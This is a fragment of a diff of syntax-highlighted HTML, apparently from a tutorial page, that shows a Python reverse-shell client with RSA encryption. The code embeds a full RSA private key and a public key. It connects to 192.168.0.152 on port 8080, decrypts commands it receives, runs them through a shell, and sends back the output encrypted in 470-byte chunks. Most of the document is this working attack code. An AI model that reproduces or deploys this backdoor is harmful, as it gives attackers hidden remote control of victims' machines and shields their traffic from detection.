-</span><span id="__span-1-78"><a id="__codelineno-1-78" name="__codelineno-1-78" href="#__codelineno-1-78"></a>    <span class="n">encryptedData</span> <span class="o">=</span> <span class="n">encryptor</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
-</span><span id="__span-1-79"><a id="__codelineno-1-79" name="__codelineno-1-79" href="#__codelineno-1-79"></a>    <span class="k">return</span> <span class="n">encryptedData</span>
-</span><span id="__span-1-80"><a id="__codelineno-1-80" name="__codelineno-1-80" href="#__codelineno-1-80"></a>
-</span><span id="__span-1-81"><a id="__codelineno-1-81" name="__codelineno-1-81" href="#__codelineno-1-81"></a><span class="k">def</span> <span class="nf">connect</span><span class="p">():</span>
-</span><span id="__span-1-82"><a id="__codelineno-1-82" name="__codelineno-1-82" href="#__codelineno-1-82"></a>    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
-</span><span id="__span-1-83"><a id="__codelineno-1-83" name="__codelineno-1-83" href="#__codelineno-1-83"></a>    <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s1">&#39;192.168.0.152&#39;</span><span class="p">,</span> <span class="mi">8080</span><span class="p">))</span>
-</span><span id="__span-1-84"><a id="__codelineno-1-84" name="__codelineno-1-84" href="#__codelineno-1-84"></a>    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
-</span><span id="__span-1-85"><a id="__codelineno-1-85" name="__codelineno-1-85" href="#__codelineno-1-85"></a>        <span class="n">command</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
-</span><span id="__span-1-86"><a id="__codelineno-1-86" name="__codelineno-1-86" href="#__codelineno-1-86"></a>
-</span><span id="__span-1-87"><a id="__codelineno-1-87" name="__codelineno-1-87" href="#__codelineno-1-87"></a>        <span class="n">command</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
-</span><span id="__span-1-88"><a id="__codelineno-1-88" name="__codelineno-1-88" href="#__codelineno-1-88"></a>        <span class="nb">print</span> <span class="p">(</span><span class="n">command</span><span class="p">)</span>
-</span><span id="__span-1-89"><a id="__codelineno-1-89" name="__codelineno-1-89" href="#__codelineno-1-89"></a>        <span class="k">if</span> <span class="s1">&#39;terminte&#39;</span> <span class="ow">in</span> <span class="n">command</span><span class="p">:</span>
-</span><span id="__span-1-90"><a id="__codelineno-1-90" name="__codelineno-1-90" href="#__codelineno-1-90"></a>            <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</span><span id="__span-1-91"><a id="__codelineno-1-91" name="__codelineno-1-91" href="#__codelineno-1-91"></a>            <span class="k">break</span>
-</span><span id="__span-1-92"><a id="__codelineno-1-92" name="__codelineno-1-92" href="#__codelineno-1-92"></a>        <span class="k">else</span><span class="p">:</span>
-</span><span id="__span-1-93"><a id="__codelineno-1-93" name="__codelineno-1-93" href="#__codelineno-1-93"></a>            <span class="n">CMD</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stdin</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">)</span>
-</span><span id="__span-1-94"><a id="__codelineno-1-94" name="__codelineno-1-94" href="#__codelineno-1-94"></a>            <span class="n">result</span> <span class="o">=</span> <span class="n">CMD</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
-</span><span id="__span-1-95"><a id="__codelineno-1-95" name="__codelineno-1-95" href="#__codelineno-1-95"></a>            <span class="nb">print</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">result</span><span class="p">))</span>
-</span><span id="__span-1-96"><a id="__codelineno-1-96" name="__codelineno-1-96" href="#__codelineno-1-96"></a>            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">470</span><span class="p">:</span>
-</span><span id="__span-1-97"><a id="__codelineno-1-97" name="__codelineno-1-97" href="#__codelineno-1-97"></a>                <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">result</span><span class="p">),</span> <span class="mi">470</span><span class="p">):</span>
-</span><span id="__span-1-98"><a id="__codelineno-1-98" name="__codelineno-1-98" href="#__codelineno-1-98"></a>                    <span class="n">chunk</span> <span class="o">=</span> <span class="n">result</span><span class="p">[</span><span class="mi">0</span><span class="o">+</span><span class="n">i</span><span class="p">:</span><span class="mi">470</span><span class="o">+</span><span class="n">i</span><span class="p">]</span>
-</span><span id="__span-1-99"><a id="__codelineno-1-99" name="__codelineno-1-99" href="#__codelineno-1-99"></a>                    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">encrypt</span><span class="p">(</span><span class="n">chunk</span><span class="p">))</span>
-</span><span id="__span-1-100"><a id="__codelineno-1-100" name="__codelineno-1-100" href="#__codelineno-1-100"></a>            <span class="k">else</span><span class="p">:</span>
-</span><span id="__span-1-101"><a id="__codelineno-1-101" name="__codelineno-1-101" href="#__codelineno-1-101"></a>                <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">encrypt</span><span class="p">(</span><span class="n">result</span><span class="p">))</span>
-</span><span id="__span-1-102"><a id="__codelineno-1-102" name="__codelineno-1-102" href="#__codelineno-1-102"></a><span class="n">connect</span><span class="p">()</span>
-</span></code></pre></div>
+<div class="language-python highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">  1</a></span>
+<span class="normal"><a href="#__codelineno-1-2">  2</a></span>
+<span class="normal"><a href="#__codelineno-1-3">  3</a></span>
+<span class="normal"><a href="#__codelineno-1-4">  4</a></span>
+<span class="normal"><a href="#__codelineno-1-5">  5</a></span>
+<span class="normal"><a href="#__codelineno-1-6">  6</a></span>
+<span class="normal"><a href="#__codelineno-1-7">  7</a></span>
+<span class="normal"><a href="#__codelineno-1-8">  8</a></span>
+<span class="normal"><a href="#__codelineno-1-9">  9</a></span>
+<span class="normal"><a href="#__codelineno-1-10"> 10</a></span>
+<span class="normal"><a href="#__codelineno-1-11"> 11</a></span>
+<span class="normal"><a href="#__codelineno-1-12"> 12</a></span>
+<span class="normal"><a href="#__codelineno-1-13"> 13</a></span>
+<span class="normal"><a href="#__codelineno-1-14"> 14</a></span>
+<span class="normal"><a href="#__codelineno-1-15"> 15</a></span>
+<span class="normal"><a href="#__codelineno-1-16"> 16</a></span>
+<span class="normal"><a href="#__codelineno-1-17"> 17</a></span>
+<span class="normal"><a href="#__codelineno-1-18"> 18</a></span>
+<span class="normal"><a href="#__codelineno-1-19"> 19</a></span>
+<span class="normal"><a href="#__codelineno-1-20"> 20</a></span>
+<span class="normal"><a href="#__codelineno-1-21"> 21</a></span>
+<span class="normal"><a href="#__codelineno-1-22"> 22</a></span>
+<span class="normal"><a href="#__codelineno-1-23"> 23</a></span>
+<span class="normal"><a href="#__codelineno-1-24"> 24</a></span>
+<span class="normal"><a href="#__codelineno-1-25"> 25</a></span>
+<span class="normal"><a href="#__codelineno-1-26"> 26</a></span>
+<span class="normal"><a href="#__codelineno-1-27"> 27</a></span>
+<span class="normal"><a href="#__codelineno-1-28"> 28</a></span>
+<span class="normal"><a href="#__codelineno-1-29"> 29</a></span>
+<span class="normal"><a href="#__codelineno-1-30"> 30</a></span>
+<span class="normal"><a href="#__codelineno-1-31"> 31</a></span>
+<span class="normal"><a href="#__codelineno-1-32"> 32</a></span>
+<span class="normal"><a href="#__codelineno-1-33"> 33</a></span>
+<span class="normal"><a href="#__codelineno-1-34"> 34</a></span>
+<span class="normal"><a href="#__codelineno-1-35"> 35</a></span>
+<span class="normal"><a href="#__codelineno-1-36"> 36</a></span>
+<span class="normal"><a href="#__codelineno-1-37"> 37</a></span>
+<span class="normal"><a href="#__codelineno-1-38"> 38</a></span>
+<span class="normal"><a href="#__codelineno-1-39"> 39</a></span>
+<span class="normal"><a href="#__codelineno-1-40"> 40</a></span>
+<span class="normal"><a href="#__codelineno-1-41"> 41</a></span>
+<span class="normal"><a href="#__codelineno-1-42"> 42</a></span>
+<span class="normal"><a href="#__codelineno-1-43"> 43</a></span>
+<span class="normal"><a href="#__codelineno-1-44"> 44</a></span>
+<span class="normal"><a href="#__codelineno-1-45"> 45</a></span>
+<span class="normal"><a href="#__codelineno-1-46"> 46</a></span>
+<span class="normal"><a href="#__codelineno-1-47"> 47</a></span>
+<span class="normal"><a href="#__codelineno-1-48"> 48</a></span>
+<span class="normal"><a href="#__codelineno-1-49"> 49</a></span>
+<span class="normal"><a href="#__codelineno-1-50"> 50</a></span>
+<span class="normal"><a href="#__codelineno-1-51"> 51</a></span>
+<span class="normal"><a href="#__codelineno-1-52"> 52</a></span>
+<span class="normal"><a href="#__codelineno-1-53"> 53</a></span>
+<span class="normal"><a href="#__codelineno-1-54"> 54</a></span>
+<span class="normal"><a href="#__codelineno-1-55"> 55</a></span>
+<span class="normal"><a href="#__codelineno-1-56"> 56</a></span>
+<span class="normal"><a href="#__codelineno-1-57"> 57</a></span>
+<span class="normal"><a href="#__codelineno-1-58"> 58</a></span>
+<span class="normal"><a href="#__codelineno-1-59"> 59</a></span>
+<span class="normal"><a href="#__codelineno-1-60"> 60</a></span>
+<span class="normal"><a href="#__codelineno-1-61"> 61</a></span>
+<span class="normal"><a href="#__codelineno-1-62"> 62</a></span>
+<span class="normal"><a href="#__codelineno-1-63"> 63</a></span>
+<span class="normal"><a href="#__codelineno-1-64"> 64</a></span>
+<span class="normal"><a href="#__codelineno-1-65"> 65</a></span>
+<span class="normal"><a href="#__codelineno-1-66"> 66</a></span>
+<span class="normal"><a href="#__codelineno-1-67"> 67</a></span>
+<span class="normal"><a href="#__codelineno-1-68"> 68</a></span>
+<span class="normal"><a href="#__codelineno-1-69"> 69</a></span>
+<span class="normal"><a href="#__codelineno-1-70"> 70</a></span>
+<span class="normal"><a href="#__codelineno-1-71"> 71</a></span>
+<span class="normal"><a href="#__codelineno-1-72"> 72</a></span>
+<span class="normal"><a href="#__codelineno-1-73"> 73</a></span>
+<span class="normal"><a href="#__codelineno-1-74"> 74</a></span>
+<span class="normal"><a href="#__codelineno-1-75"> 75</a></span>
+<span class="normal"><a href="#__codelineno-1-76"> 76</a></span>
+<span class="normal"><a href="#__codelineno-1-77"> 77</a></span>
+<span class="normal"><a href="#__codelineno-1-78"> 78</a></span>
+<span class="normal"><a href="#__codelineno-1-79"> 79</a></span>
+<span class="normal"><a href="#__codelineno-1-80"> 80</a></span>
+<span class="normal"><a href="#__codelineno-1-81"> 81</a></span>
+<span class="normal"><a href="#__codelineno-1-82"> 82</a></span>
+<span class="normal"><a href="#__codelineno-1-83"> 83</a></span>
+<span class="normal"><a href="#__codelineno-1-84"> 84</a></span>
+<span class="normal"><a href="#__codelineno-1-85"> 85</a></span>
+<span class="normal"><a href="#__codelineno-1-86"> 86</a></span>
+<span class="normal"><a href="#__codelineno-1-87"> 87</a></span>
+<span class="normal"><a href="#__codelineno-1-88"> 88</a></span>
+<span class="normal"><a href="#__codelineno-1-89"> 89</a></span>
+<span class="normal"><a href="#__codelineno-1-90"> 90</a></span>
+<span class="normal"><a href="#__codelineno-1-91"> 91</a></span>
+<span class="normal"><a href="#__codelineno-1-92"> 92</a></span>
+<span class="normal"><a href="#__codelineno-1-93"> 93</a></span>
+<span class="normal"><a href="#__codelineno-1-94"> 94</a></span>
+<span class="normal"><a href="#__codelineno-1-95"> 95</a></span>
+<span class="normal"><a href="#__codelineno-1-96"> 96</a></span>
+<span class="normal"><a href="#__codelineno-1-97"> 97</a></span>
+<span class="normal"><a href="#__codelineno-1-98"> 98</a></span>
+<span class="normal"><a href="#__codelineno-1-99"> 99</a></span>
+<span class="normal"><a href="#__codelineno-1-100">100</a></span>
+<span class="normal"><a href="#__codelineno-1-101">101</a></span>
+<span class="normal"><a href="#__codelineno-1-102">102</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a><span class="kn">import</span> <span class="nn">subprocess</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2"></a><span class="kn">import</span> <span class="nn">socket</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3"></a><span class="kn">from</span> <span class="nn">Cryptodome.Cipher</span> <span class="kn">import</span> <span class="n">PKCS1_OAEP</span>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4"></a><span class="kn">from</span> <span class="nn">Cryptodome.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5"></a><span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">cipher</span><span class="p">):</span>
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6"></a>    <span class="n">privatekey</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;-----BEGIN RSA PRIVATE KEY-----</span>
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7"></a><span class="s1">MIIJKQIBAAKCAgEAt9mjsBED9D/MYnU+W5+6aP9SS1vgL9X6bThNkGKsZ5ZVfnoK</span>
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8"></a><span class="s1">4BxMBHI5Gi/YtoCJjyAGsWMpxy1fQ+F+ZWVAkwZDoQMWTrfZASHmQgB944PfGA7q</span>
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9"></a><span class="s1">fn15kDXmCyvzbitRyWvTs1LDDNF7Q/54Qj82h/85ibOPzQrpwQTjEAs8CJ14YWXA</span>
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10"></a><span class="s1">JnqOC6devaDYKdB7SSlueVtoQ8BxWc3hOJHJpvgZQ/6NixnICLIrFN0YbKZo4A0D</span>
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11"></a><span class="s1">3yRJIdumZw8uqwEMeIt41ja6zOG3gKtsG8suBZ/MvqX0WgojWr6hNs1Q8h3LtiSs</span>
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12"></a><span class="s1">PiUP/bTWD9zos8Yr7RuEabesjHlY0qcNzZ/YgKXdgxUkCikTjRon6Mvh7iWKAtEi</span>
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13"></a><span class="s1">lQlDeBYMGUvFUQ5FMF5LZJ5Q/7+JXulv8WhqKTp4dGpB3kUWuN+ltxBr+IYPhpBf</span>
+</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14"></a><span class="s1">McR97W+NuXDReUiIGFJpVI1m4AeCzz1BdAM7U928DcglK6IowMmN4McyKuv49YYP</span>
+</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15"></a><span class="s1">d7TNFjJWc7P6e19V3BsxA5jpCc6Dxp5AM6WC0FqgSSOGVCIkcHT5wLcALyaXOaO0</span>
+</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16"></a><span class="s1">vhMgWWO233Of33wh/7oHclsc5r44MHlZrNSeX2QIHCFU4Mwp1hutIuIKkn5dLt1q</span>
+</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17"></a><span class="s1">mt2CDUO/uxGbdTf667c9TLYcYWoi/eDBdrVx7CkYI7g81RdcB6jGgbr9W4kCAwEA</span>
+</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18"></a><span class="s1">AQKCAgAIZt7PJgfrOpspiLgf0c3gDIMDRKCbLwkxwpfw2EGOvlUL4aHrmf9zWJD5</span>
+</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19"></a><span class="s1">fGRH+tnOe6UyqBh5rL4kyQJQue7YiTm/+vcjA83b+mOeco1OP3GLlOrseul6SKxJ</span>
+</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20"></a><span class="s1">qGmIiFxFezMCh+64AD7E3bU7Oc5RKr3DaDxTH4ONOZ7y1cCZmDCvKso8N++T4sM2</span>
+</span><span id="__span-1-21"><a id="__codelineno-1-21" name="__codelineno-1-21"></a><span class="s1">oUofpxJrRoRw8VdzeTD07K61OhxgEAh/jfuD9tqoYxQK8Quzs2spig66PNtGu9X/</span>
+</span><span id="__span-1-22"><a id="__codelineno-1-22" name="__codelineno-1-22"></a><span class="s1">8batQ/AA9kbAa2HgCRSswajAIGnrAeGGeOkQ0FPLStjtOzbOycPMgCKK+IChlIkP</span>
+</span><span id="__span-1-23"><a id="__codelineno-1-23" name="__codelineno-1-23"></a><span class="s1">0oWj6ZOKU26asjUlekov3kiINBzduF+bGOKGnoxeguSiQE1DtsfXisvADMp53rLN</span>
+</span><span id="__span-1-24"><a id="__codelineno-1-24" name="__codelineno-1-24"></a><span class="s1">RjkzWDTN7l8zqgAd2hPB25Fhy5kKHA1MNqRPeUUIUp++FuYVJ1xNoMR61N6JvLzC</span>
+</span><span id="__span-1-25"><a id="__codelineno-1-25" name="__codelineno-1-25"></a><span class="s1">UTrUZW7mMxqXisccsuU8OdGB2DECP+sS82dWZqoKFZKjza1N5XBSm1f7nCTQqtJq</span>
+</span><span id="__span-1-26"><a id="__codelineno-1-26" name="__codelineno-1-26"></a><span class="s1">kYYA5d4FPJ1wxRKufRTklC6QSHoGm54z0ay4Mh0n08wIiYBRxsgtGk6crhpRfy12</span>
+</span><span id="__span-1-27"><a id="__codelineno-1-27" name="__codelineno-1-27"></a><span class="s1">e6lRU3htQnzc+JDrdZIjoL5lqDfi0wSxdVXAAQXRptsvSXwwt+h/zg9ZmqlsVoE1</span>
+</span><span id="__span-1-28"><a id="__codelineno-1-28" name="__codelineno-1-28"></a><span class="s1">hH7LeVyL31FRF1b2BiX7jyOeeoqZ1gkkNvwyvqnaOos+wGd2/QKCAQEA0aeVV0HM</span>
+</span><span id="__span-1-29"><a id="__codelineno-1-29" name="__codelineno-1-29"></a><span class="s1">HpJ7hUib/btWbX/zYQEwQRRCbHWGsxROumkJPgfRzPhDohDgv4ncrX0w7+4PESGp</span>
+</span><span id="__span-1-30"><a id="__codelineno-1-30" name="__codelineno-1-30"></a><span class="s1">9MNZBa9kPuwDNFsVxIdpWZgmJdALqLwpWPnGswwVp6Lk1jMHD2GxLkknHLvfmND3</span>
+</span><span id="__span-1-31"><a id="__codelineno-1-31" name="__codelineno-1-31"></a><span class="s1">fuqVj7k/bKFayqejlY2SyNUv/h+DsQQL2esM8A4TLGlFOgfaoz0wPii2HmANQPSa</span>
+</span><span id="__span-1-32"><a id="__codelineno-1-32" name="__codelineno-1-32"></a><span class="s1">16xjV/0uQGHW260d1norNVZCmRDC3Gqz8/rcTGYwEkeCCQ3ctlUJyAFVu+ILyIga</span>
+</span><span id="__span-1-33"><a id="__codelineno-1-33" name="__codelineno-1-33"></a><span class="s1">/kadDqiUkItIKl+fQI3stPyrHjh5cMUk+kPMjO36/yQ0f3Ox8cUkR5x3eW4RoFZQ</span>
+</span><span id="__span-1-34"><a id="__codelineno-1-34" name="__codelineno-1-34"></a><span class="s1">/khhdDqVmieQ/wKCAQEA4H3GCf1LijS7069AEyvOKcKTL+nDGdqz+xMc+sbtha37</span>
+</span><span id="__span-1-35"><a id="__codelineno-1-35" name="__codelineno-1-35"></a><span class="s1">8hh9mjvFaljJcKb4AxTTnT8RrCnabdtmuAXRsfHOu1BZdJAaW+hgWgY+PJL+XpBQ</span>
+</span><span id="__span-1-36"><a id="__codelineno-1-36" name="__codelineno-1-36"></a><span class="s1">8D3954EvE2aX910DDMYz2slm0IL5we8KLg76ZHi+zO8woeedSD7yHbox6ybHZr0H</span>
+</span><span id="__span-1-37"><a id="__codelineno-1-37" name="__codelineno-1-37"></a><span class="s1">L7G8fwI9zg/oz7+0P+vU3AV5hgnUDx5kY1hYNWmrBkgObRfJQNsiCDHkw6wRZPU+</span>
+</span><span id="__span-1-38"><a id="__codelineno-1-38" name="__codelineno-1-38"></a><span class="s1">XESQX2iUnh8HA7idWvLELFXjueHxEw15yKaw9toiO0T1MhbrBBsjElXDk6WuKmVj</span>
+</span><span id="__span-1-39"><a id="__codelineno-1-39" name="__codelineno-1-39"></a><span class="s1">C2/ZvG939IOO2cW8UeBdTABhO630QQdDtAk0YqILdwKCAQEAjm1UrSSL8LD+rPs4</span>
+</span><span id="__span-1-40"><a id="__codelineno-1-40" name="__codelineno-1-40"></a><span class="s1">zdS40Ea+JkZSa8PBpEDrMzk2irjUiIlzY9W8zJq+tCCKBGoqFrUZE0BVX2xeS9ht</span>
+</span><span id="__span-1-41"><a id="__codelineno-1-41" name="__codelineno-1-41"></a><span class="s1">N7nKK4U9cnezgCQ2tjVx1j2NsV5uODCbfXjSERo1T6PEZHdZ1NFlA0HjARuIY00r</span>
+</span><span id="__span-1-42"><a id="__codelineno-1-42" name="__codelineno-1-42"></a><span class="s1">4zZyoX3lSbIV5828ft0V7+mZy389GM/XArK5TsULKR5mabPqlRQXrOr/TklUa/AZ</span>
+</span><span id="__span-1-43"><a id="__codelineno-1-43" name="__codelineno-1-43"></a><span class="s1">va858Z7XyF7Sf7eMIsQaPPdYLQVdJ6G8Qo7FrjT2nf+DV5ZgkfTsoFymSdva0px/</span>
+</span><span id="__span-1-44"><a id="__codelineno-1-44" name="__codelineno-1-44"></a><span class="s1">4PpeGjs/yvEfv4xvC2a+SXgEuOfaTFtXyoDkETmdx2twTB3lpF68Jrq85yJw4i7y</span>
+</span><span id="__span-1-45"><a id="__codelineno-1-45" name="__codelineno-1-45"></a><span class="s1">dvkuLQKCAQBefJGeIr5orUlhD6Iob4eWjA7nW7yCZUrbom/QHWpbmZ8xhp1XDVFK</span>
+</span><span id="__span-1-46"><a id="__codelineno-1-46" name="__codelineno-1-46"></a><span class="s1">MZSXla9NnLZ0uNb3X6ZQFshlLA3Wl7ArpuX/6acuh+AGBBqt5DCsHJH0jCMSDY2C</span>
+</span><span id="__span-1-47"><a id="__codelineno-1-47" name="__codelineno-1-47"></a><span class="s1">3OuZccyW09V/gMWFfZshxTrDqAo7v5aPKx2NB69reRLu8C+Sif/jfixIJsbvrkHV</span>
+</span><span id="__span-1-48"><a id="__codelineno-1-48" name="__codelineno-1-48"></a><span class="s1">OV0EE+wJ+3jcInHDuN9IfcJDDiwSTydsvWdVA23xnkn0qQtgUEwB8jcNHs6lWZ8z</span>
+</span><span id="__span-1-49"><a id="__codelineno-1-49" name="__codelineno-1-49"></a><span class="s1">7ltFda7FWOi4wG3ZDwAoxMM9cOuK+sTtrViGfJ7uW32nefGXc2Sa85F8ftdmOISE</span>
+</span><span id="__span-1-50"><a id="__codelineno-1-50" name="__codelineno-1-50"></a><span class="s1">pdq6Tj+1NnoOQxqpw83KkQQuArHJ0eqBAoIBAQDPchq4XMwlEfjVjZCJEX++UyEA</span>
+</span><span id="__span-1-51"><a id="__codelineno-1-51" name="__codelineno-1-51"></a><span class="s1">5H2hKbWOXU9WNhZCKmScrAlkW/6L0lHs1mngfxxavKOy2jIoUhb2/zeA/MKx6Jxa</span>
+</span><span id="__span-1-52"><a id="__codelineno-1-52" name="__codelineno-1-52"></a><span class="s1">PqiKaOdqTYn6yaLkRS+7jUndDeFqDVCLqt3NprltVzLphjOB0I8PsUnIj5lKcE5K</span>
+</span><span id="__span-1-53"><a id="__codelineno-1-53" name="__codelineno-1-53"></a><span class="s1">DjtbjnJYCjj0o346t3abOOoqxqYJmXgieRWkjjidkBOvL/Td7OZXM6jPVj744+ZE</span>
+</span><span id="__span-1-54"><a id="__codelineno-1-54" name="__codelineno-1-54"></a><span class="s1">K2D/g7XtAIOACmSpYTtHRl7bxcoKP7QiPksNG17w+LWUqF2TwBexyCDKCV5XSIB9</span>
+</span><span id="__span-1-55"><a id="__codelineno-1-55" name="__codelineno-1-55"></a><span class="s1">YVPwkPTGTNbOtTuTJk5hO+W4Nij4ERDdQlxd961YgRHORov+2sFREdhbrV0s</span>
+</span><span id="__span-1-56"><a id="__codelineno-1-56" name="__codelineno-1-56"></a><span class="s1">-----END RSA PRIVATE KEY-----&#39;&#39;&#39;</span>
+</span><span id="__span-1-57"><a id="__codelineno-1-57" name="__codelineno-1-57"></a>    <span class="n">private_key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">importKey</span><span class="p">(</span><span class="n">privatekey</span><span class="p">)</span>
+</span><span id="__span-1-58"><a id="__codelineno-1-58" name="__codelineno-1-58"></a>    <span class="n">decryptor</span> <span class="o">=</span> <span class="n">PKCS1_OAEP</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">private_key</span><span class="p">)</span>
+</span><span id="__span-1-59"><a id="__codelineno-1-59" name="__codelineno-1-59"></a>    <span class="k">return</span> <span class="n">decryptor</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">cipher</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span><span id="__span-1-60"><a id="__codelineno-1-60" name="__codelineno-1-60"></a>
+</span><span id="__span-1-61"><a id="__codelineno-1-61" name="__codelineno-1-61"></a><span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">message</span><span class="p">):</span>
+</span><span id="__span-1-62"><a id="__codelineno-1-62" name="__codelineno-1-62"></a>    <span class="n">publickey</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;-----BEGIN PUBLIC KEY-----</span>
+</span><span id="__span-1-63"><a id="__codelineno-1-63" name="__codelineno-1-63"></a><span class="s1">MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEApceMHQ9c5Cdf+qgd4ASP</span>
+</span><span id="__span-1-64"><a id="__codelineno-1-64" name="__codelineno-1-64"></a><span class="s1">M7WNbKavEwat78bMHQVK6cRNm2XSWCLpTsYN2eUALV++dYi2Im0T92bqYojRm+p4</span>
+</span><span id="__span-1-65"><a id="__codelineno-1-65" name="__codelineno-1-65"></a><span class="s1">vVKOvrdmcmfnITEw/++pbvGZYRf2y0zsSJi1Mi+lfgQs56QXBMIU6IdeCL2C7cex</span>
+</span><span id="__span-1-66"><a id="__codelineno-1-66" name="__codelineno-1-66"></a><span class="s1">9LNJ98ipGeN6nBiaExI9he3PcivztD5vHowCwkbzAnpZgPamrN10/KukWKvJ3t05</span>
+</span><span id="__span-1-67"><a id="__codelineno-1-67" name="__codelineno-1-67"></a><span class="s1">bc0MskjkhVaaN55eidzAXUmYmxyoLeke1GssiU+TInZQXbSiUeeFsZpkMjYX4nCS</span>
+</span><span id="__span-1-68"><a id="__codelineno-1-68" name="__codelineno-1-68"></a><span class="s1">xT/TuuFaDy6tfpfM+ePNEgeLjn7WAJh2ApxaYhmqwbDTsXd0ldHc4iNeGmlaEGE9</span>
+</span><span id="__span-1-69"><a id="__codelineno-1-69" name="__codelineno-1-69"></a><span class="s1">DgXPSp7ljV9SZ7eO9LZuiERz003NrUqSKSHdYgEIH8wZrCiKSP471oNYn0ye+KdV</span>
+</span><span id="__span-1-70"><a id="__codelineno-1-70" name="__codelineno-1-70"></a><span class="s1">/v25dqTXApO3QO/LZrJQ8twQyASR1LB3tTVYGuNpRVLlNC4j4ivL22uDCbGOIBOa</span>
+</span><span id="__span-1-71"><a id="__codelineno-1-71" name="__codelineno-1-71"></a><span class="s1">KDmu/QR5imLdjj3alVg69Ci3It3jTlubtHDaXTVs+i1133fOKMnRPLmCHE1/6MMS</span>
+</span><span id="__span-1-72"><a id="__codelineno-1-72" name="__codelineno-1-72"></a><span class="s1">i1BzDF46Q2XJwjgDnH5rk70n7sVquQtpHZkpQsuSSrjiL9Bi3jYghReVfFHC7aNF</span>
+</span><span id="__span-1-73"><a id="__codelineno-1-73" name="__codelineno-1-73"></a><span class="s1">p42v7EMaLohpnFm6yKiEm5UacMs7rLdnUQtAKo3r5UiNAegY6h/ZDncGhah1e5wF</span>
+</span><span id="__span-1-74"><a id="__codelineno-1-74" name="__codelineno-1-74"></a><span class="s1">dBPIb9wJyTjPYTiTJ3rDQGECAwEAAQ==</span>
+</span><span id="__span-1-75"><a id="__codelineno-1-75" name="__codelineno-1-75"></a><span class="s1">-----END PUBLIC KEY-----&#39;&#39;&#39;</span>
+</span><span id="__span-1-76"><a id="__codelineno-1-76" name="__codelineno-1-76"></a>    <span class="n">public_key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">importKey</span><span class="p">(</span><span class="n">publickey</span><span class="p">)</span>
+</span><span id="__span-1-77"><a id="__codelineno-1-77" name="__codelineno-1-77"></a>    <span class="n">encryptor</span> <span class="o">=</span> <span class="n">PKCS1_OAEP</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">public_key</span><span class="p">)</span>
